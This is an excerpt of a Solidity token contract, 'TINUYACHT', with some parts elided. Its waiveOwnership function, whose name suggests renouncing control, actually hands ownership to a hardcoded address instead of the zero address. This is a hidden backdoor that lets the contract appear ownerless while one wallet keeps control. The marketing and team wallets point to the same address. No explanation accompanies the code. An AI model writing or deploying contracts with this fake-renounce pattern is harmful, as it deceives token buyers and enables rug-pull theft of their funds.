...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x662672Fde8a34697a6D49a600Ab25DCe5914Ba0f);
    }
...
contract TINUYACHT is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "TINUYACHT";
    string private _symbol = "TINUYACHT";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x728139FCEC93C329a7e9dcD27E584d100e4890d8);
    address payable public teamWalletAddress = payable(0x728139FCEC93C329a7e9dcD27E584d100e4890d8);
